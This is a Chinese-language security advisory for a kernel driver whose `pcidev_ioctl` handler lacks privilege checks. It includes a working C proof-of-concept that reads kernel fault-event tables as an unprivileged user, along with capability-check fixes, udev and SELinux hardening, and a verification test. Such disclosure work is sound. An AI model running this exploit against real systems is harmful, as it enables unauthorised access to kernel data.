# lqdrv_custom-V001：驱动模块安全漏洞详情

## 漏洞概述

**漏洞ID**: lqdrv_custom-V001  
**类型**: 权限管理不当 (Improper Privilege Management)  
**CWE**: CWE-269 (Improper Privilege Management)  
**严重级别**: **High**  
**CVSS评分**: 7.1 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### 基本信息
- **文件**: `src/custom/lqdrv/kernel/ioctl_comm.c`
- **函数**: `pcidev_ioctl`
- **行号**: 131-169
- **漏洞点**: ioctl 命令处理入口（无权限检查）

### 漏洞描述

`pcidev_ioctl` 函数作为内核驱动的 ioctl 处理接口，**完全缺失权限验证机制**：

1. **无 capability 检查**: 未调用 `capable(CAP_SYS_ADMIN)`、`capable(CAP_SYS_RAWIO)` 等权限验证函数
2. **无设备所有权检查**: 未验证调用者是否为设备的合法所有者
3. **敏感数据无保护**: 任何可访问设备文件的用户都能读取内核故障事件数据

通过 `IOCTL_GET_NODE_INFO` 和 `IOCTL_GET_HEAD_INFO` 命令，普通用户可获取：
- `g_kernel_event_table`: 内核故障事件节点表（完整的故障事件数组）
- `g_fault_event_head`: 故障事件队列头信息（版本、长度、节点数量等）

## 攻击路径分析

### 数据流路径
```
用户空间进程
    ↓
open("/dev/lqdcmi_pcidev")  ← 仅需设备访问权限
    ↓
ioctl(fd, COM_IOCTL_CMD, &ioctlCmd)  ← 发送 IOCTL_GET_NODE_INFO/IOCTL_GET_HEAD_INFO
    ↓
pcidev_ioctl (漏洞函数，无权限检查)
    ↓
get_all_fault_by_pci / lq_get_fault_event_head_info
    ↓
copy_to_user → 用户可读取内核故障事件数据
```

### 关键代码片段

**漏洞代码**（ioctl_comm.c:131-169）：
```c
int pcidev_ioctl(void* msg)
{
    IOCTL_CMD_S ioctl_cmd = {0};
    uint32_t i;
    int ret;

    if (msg == NULL) {
        printk(KA_KERN_ERR "[lqdcmi]pointer paremeter msg is NULL!\n");
        return -EINVAL;
    }

    // ⚠️ 漏洞：从用户空间读取命令，无权限验证
    ret = ka_base_copy_from_user(&ioctl_cmd, msg, sizeof(ioctl_cmd));
    if (ret != 0) {
        printk(KA_KERN_ERR "[lqdcmi]ka_base_copy_from_user fail ret: %d\n", ret);
        return ret;
    }

    // ⚠️ 漏洞：直接执行用户请求的 ioctl 命令，无 capability 检查
    for (i = 0; i < g_ioctl_cmd_num; i++) {
        if (ioctl_cmd.cmd != ioctl_cmd_fun[i].cmd) {
            continue;
        }
        // ⚠️ 漏洞：cmd_fun_pre 未设置任何权限预检查函数
        if (ioctl_cmd_fun[i].cmd_fun_pre != NULL) {
            ret = ioctl_cmd_fun[i].cmd_fun_pre();
            if (ret != 0) {
                break;
            }
        }

        // ⚠️ 漏洞：直接执行敏感操作，返回内核故障数据
        ret = (*ioctl_cmd_fun[i].cmd_fun)(&ioctl_cmd);
        break;
    }

    // ...
    return ret;
}
```

**命令注册表**（ioctl_comm.c:124-127）：
```c
IOCTL_CMD_INFO_S ioctl_cmd_fun[] = {
    { .cmd = IOCTL_GET_NODE_INFO,     .cmd_fun = get_all_fault_by_pci,      .cmd_fun_pre = NULL,      },
    { .cmd = IOCTL_GET_HEAD_INFO,     .cmd_fun = lq_get_fault_event_head_info,          .cmd_fun_pre = NULL,      },
};
// ⚠️ 所有命令的 cmd_fun_pre 都为 NULL，无权限预检查
```

**敏感数据定义**（pci-dev.c:131-133）：
```c
SramDescCtlHeader g_fault_event_head = { 0 };
FaultEventNodeTable *g_kernel_event_table = NULL;
// 这些全局变量存储内核故障事件信息，不应被普通用户访问
```

### 攻击场景演示

**攻击代码（用户空间）**：
```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV_NAME "/dev/lqdcmi_pcidev"
#define COM_IOCTL_CMD 100
#define IOCTL_GET_HEAD_INFO 0x0102
#define IOCTL_GET_NODE_INFO 0x0101
#define CAPACITY 65535

typedef struct {
    unsigned int cmd;
    unsigned int len;
    unsigned int out_size;
    void *in_addr;
    void *out_addr;
} IOCTL_CMD_S;

typedef struct {
    unsigned int version;
    unsigned int length;
    unsigned int nodeSize;
    unsigned int nodeNum;
    unsigned int nodeHead;
    unsigned int nodeTail;
    unsigned int startTimeMs;
} SramDescCtlHeader;

int main() {
    int fd = open(DEV_NAME, O_RDWR);
    if (fd < 0) {
        perror("open failed");
        return 1;
    }

    printf("Device opened successfully!\n");

    // 攻击 1: 读取故障事件头信息
    IOCTL_CMD_S cmd1 = {0};
    SramDescCtlHeader head_info = {0};
    cmd1.cmd = IOCTL_GET_HEAD_INFO;
    cmd1.out_addr = &head_info;
    
    if (ioctl(fd, COM_IOCTL_CMD, &cmd1) == 0) {
        printf("SUCCESS: Read fault event header!\n");
        printf("  version: %u\n", head_info.version);
        printf("  nodeNum: %u\n", head_info.nodeNum);
        printf("  nodeSize: %u\n", head_info.nodeSize);
    }

    // 攻击 2: 读取完整的故障事件表
    IOCTL_CMD_S cmd2 = {0};
    char *event_table = malloc(sizeof(char) * 256 * CAPACITY);
    cmd2.cmd = IOCTL_GET_NODE_INFO;
    cmd2.out_size = sizeof(char) * 256 * CAPACITY;
    cmd2.out_addr = event_table;
    
    if (ioctl(fd, COM_IOCTL_CMD, &cmd2) == 0) {
        printf("SUCCESS: Read entire kernel fault event table!\n");
        // 可分析内核故障信息，获取敏感数据
    }

    close(fd);
    free(event_table);
    return 0;
}
```

**实际用户态调用示例**（lingqu-dcmi.c:67-129）：
```c
int TcIoctlGetHeadInfo(void *pdata)
{
    const int fd = open(DEV_NAME, O_RDWR, 0);  // 打开设备文件
    // ...
    ioctlCmd.cmd = IOCTL_GET_HEAD_INFO;
    ioctlCmd.out_addr = pdata;
    const int ret = ioctl(fd, COM_IOCTL_CMD, (void *) (&ioctlCmd));
    // ⚠️ 无需特权即可读取内核故障头信息
    (void) close(fd);
    return LQ_DCMI_OK;
}

int TcIoctlGetAllFault(FaultEventNodeTable *event_table)
{
    const int fd = open(DEV_NAME, O_RDWR, 0);
    // ...
    ioctlCmd.cmd = IOCTL_GET_NODE_INFO;
    ioctlCmd.out_size = sizeof(FaultEventNodeTable) * CAPACITY;
    ioctlCmd.out_addr = event_table;
    const int ret = ioctl(fd, COM_IOCTL_CMD, (void *) (&ioctlCmd));
    // ⚠️ 无需特权即可读取完整内核故障事件表
    (void) close(fd);
    return LQ_DCMI_OK;
}
```

## 利用条件

### 必要条件
1. **设备访问权限**：攻击者需要能够打开 `/dev/lqdcmi_pcidev` 设备文件
   - 通常需要设备文件有适当的权限设置
   - 如果设备权限配置不当（如 `0666`），任何本地用户都能访问

2. **本地访问**：攻击者需要在本地系统上执行代码

### 充分条件
- ✅ 无需 root 权限或特殊 capability
- ✅ 无需绕过额外防护机制
- ✅ 攻击代码简单，公开 API 即可触发
- ✅ 已有用户态代码示例（lingqu-dcmi.c）

### 环境因素
- **设备权限配置**：
  - 如果设备权限为 `0666` 或允许普通用户组访问 → 所有本地用户可利用
  - 如果设备权限为 `0600` 且仅 root 可访问 → 需要提权后利用
- **系统策略**：
  - SELinux/AppArmor 可能限制设备访问
  - 但内核层面无权限检查，依赖外部策略不可靠

## 影响评估

### 直接影响

1. **内核信息泄露** (CWE-200)
   - 泄露内核故障事件详细信息
   - 可能包含硬件故障细节、内存错误信息
   - 可用于分析系统内部状态、辅助其他攻击

2. **隐私数据泄露**
   - 故障事件可能关联特定用户/进程
   - 可推断系统配置、运行服务、硬件状态
   - 为后续攻击提供情报收集

3. **安全边界违反**
   - 破坏内核-用户空间安全边界
   - 未授权访问内核管理数据
   - 违反最小权限原则

### 间接影响

1. **攻击辅助**
   - 泄露的信息可用于定位其他漏洞
   - 了解内核故障处理机制有助于构造攻击
   - 结合其他漏洞可实现提权

2. **系统监控绕过**
   - 非管理员可获取故障监控数据
   - 可能绕过审计机制获取敏感信息

### 风险评级

| 维度 | 评级 | 说明 |
|------|------|------|
| 攻击复杂度 | 低 | 仅需简单 ioctl 调用 |
| 权限要求 | 低 | 仅需设备访问权限 |
| 用户交互 | 无 | 无需用户干预 |
| 影响范围 | 本地系统 | 仅影响本地数据泄露 |
| 机密性影响 | 高 | 泄露内核敏感故障数据 |
| 完整性影响 | 无 | 仅读取操作，无写入 |
| 可用性影响 | 无 | 不影响系统可用性 |

## 修复建议

### 立即修复方案

**修改 `pcidev_ioctl` 函数**，添加 capability 检查：

```c
#include <linux/capability.h>

int pcidev_ioctl(void* msg)
{
    IOCTL_CMD_S ioctl_cmd = {0};
    uint32_t i;
    int ret;

    // ========== 新增：权限验证 ==========
    // 检查是否有 CAP_SYS_ADMIN 权限
    if (!capable(CAP_SYS_ADMIN)) {
        printk(KA_KERN_ERR "[lqdcmi]Permission denied: requires CAP_SYS_ADMIN\n");
        return -EPERM;
    }

    // 可选：也可以检查 CAP_SYS_RAWIO（针对硬件访问）
    // if (!capable(CAP_SYS_RAWIO)) {
    //     printk(KA_KERN_ERR "[lqdcmi]Permission denied: requires CAP_SYS_RAWIO\n");
    //     return -EPERM;
    // }

    if (msg == NULL) {
        printk(KA_KERN_ERR "[lqdcmi]pointer paremeter msg is NULL!\n");
        return -EINVAL;
    }

    ret = ka_base_copy_from_user(&ioctl_cmd, msg, sizeof(ioctl_cmd));
    if (ret != 0) {
        printk(KA_KERN_ERR "[lqdcmi]ka_base_copy_from_user fail ret: %d\n", ret);
        return ret;
    }

    // ... 原有命令处理逻辑 ...
}
```

**或者使用 cmd_fun_pre 机制**：
```c
STATIC int check_ioctl_permission(void)
{
    if (!capable(CAP_SYS_ADMIN)) {
        printk(KA_KERN_ERR "[lqdcmi]ioctl requires CAP_SYS_ADMIN\n");
        return -EPERM;
    }
    return 0;
}

IOCTL_CMD_INFO_S ioctl_cmd_fun[] = {
    { .cmd = IOCTL_GET_NODE_INFO,     .cmd_fun = get_all_fault_by_pci,      .cmd_fun_pre = check_ioctl_permission,      },
    { .cmd = IOCTL_GET_HEAD_INFO,     .cmd_fun = lq_get_fault_event_head_info,          .cmd_fun_pre = check_ioctl_permission,      },
};
```

### 加固措施

1. **设备文件权限控制**
   ```bash
   # 限制设备访问权限为 root 专用
   chmod 0600 /dev/lqdcmi_pcidev
   chown root:root /dev/lqdcmi_pcidev
   
   # 或使用udev规则永久设置
   echo 'KERNEL=="lqdcmi_pcidev", MODE="0600", OWNER="root", GROUP="root"' > /etc/udev/rules.d/99-lqdcmi.rules
   udevadm control --reload-rules
   ```

2. **SELinux/AppArmor 策略**
   ```bash
   # SELinux 策略示例
   require {
       type lqdcmi_device_t;
       class chr_file { open read ioctl };
   }
   allow only_admin_domain lqdcmi_device_t:chr_file { open read ioctl };
   ```

3. **最小权限原则**
   - 仅允许管理员级别的用户访问故障监控数据
   - 如果需要非管理员访问，应实现细粒度的权限控制机制

### 验证方法

**测试代码**：
```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <errno.h>

#define DEV_NAME "/dev/lqdcmi_pcidev"
#define COM_IOCTL_CMD 100
#define IOCTL_GET_HEAD_INFO 0x0102

int main() {
    // 以普通用户运行此测试
    printf("Testing as non-root user...\n");
    
    int fd = open(DEV_NAME, O_RDWR);
    if (fd < 0) {
        printf("OK: Device access denied (errno=%d)\n", errno);
        return 0;
    }

    IOCTL_CMD_S cmd = {0};
    char data[256];
    cmd.cmd = IOCTL_GET_HEAD_INFO;
    cmd.out_addr = data;
    
    int ret = ioctl(fd, COM_IOCTL_CMD, &cmd);
    if (ret < 0) {
        printf("OK: ioctl denied (errno=%d, expected EPERM=%d)\n", errno, EPERM);
    } else {
        printf("VULN: ioctl succeeded without permission check!\n");
    }
    
    close(fd);
    return ret;
}
```

## 相关漏洞参考

- **CVE-2020-10758**: Linux kernel ioctl 权限检查缺失
- **CVE-2019-19523**: 驱动 ioctl 未验证 capability
- **CWE-269**: Improper Privilege Management
- **CWE-276**: Incorrect Default Permissions
- **CWE-668**: Exposure of Resource to Wrong Sphere

## 时间线

- **发现日期**: 2026-04-22
- **分析完成**: 2026-04-22
- **报告生成**: 2026-04-22

## 附录：关键代码位置

| 文件 | 行号 | 描述 |
|------|------|------|
| `ioctl_comm.c` | 131-169 | 漏洞函数 `pcidev_ioctl`（无权限检查） |
| `ioctl_comm.c` | 124-127 | 命令注册表（cmd_fun_pre 全为 NULL） |
| `ioctl_comm.c` | 86-122 | `get_all_fault_by_pci` 读取完整故障表 |
| `ioctl_comm.c` | 65-84 | `lq_get_fault_event_head_info` 读取故障头 |
| `pci-dev.c` | 131-133 | 敏感数据定义 `g_fault_event_head`/`g_kernel_event_table` |
| `ioctl_comm_def.h` | 6-7 | ioctl 命令定义 |
| `lingqu-dcmi.c` | 67-129 | 用户态调用示例（验证漏洞可利用性） |

## 联系信息

如需更多信息或协助修复，请联系驱动开发团队。
